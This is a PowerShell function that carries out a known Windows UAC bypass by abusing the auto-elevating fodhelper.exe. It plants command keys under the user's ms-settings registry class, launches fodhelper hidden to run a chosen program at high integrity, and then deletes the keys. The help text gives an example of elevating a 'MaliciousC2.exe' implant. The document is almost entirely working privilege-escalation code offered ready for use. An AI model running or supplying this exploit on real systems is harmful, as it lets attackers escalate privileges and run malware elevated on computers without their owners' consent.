function Invoke-FODHelperUACBypass
{
<#
.SYNOPSIS
This is a simple PowerShell function to bypass UAC by abusing the fact that
the autoelevate executable, FODHelper.exe, queries registry entries under 
control of the current user (HKCU).  All credit goes to @winscripting

.DESCRIPTION
This is a simple PowerShell function to bypass UAC by abusing the fact that
the autoelevate executable, FODHelper.exe, queries registry entries under 
control of the current user (HKCU). All credit goes to @winscripting

.PARAMETER Command
Full path of what you would like to run as administrator, including arguments.

.EXAMPLE

PS > Invoke-FODHelperUACBypass

Use above command to bypass UAC and spawn a new high integrity command window.

.EXAMPLE

PS > Invoke-FODHelperUACBypass -Command "C:\MaliciousC2.exe"

Use above command to bypass UAC and run MaliciousC2.exe as a high integrity process.

.LINK
https://github.com/reigningshells

#>
	[CmdletBinding()]
	param (

		[Parameter(Mandatory = $False)]
		[String]$Command = "C:\Windows\System32\cmd.exe /k "

	)
	
	# Create registry entries
 
	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
 
	# Perform the bypass
	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
	# Cleanup registry entries
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
	
}
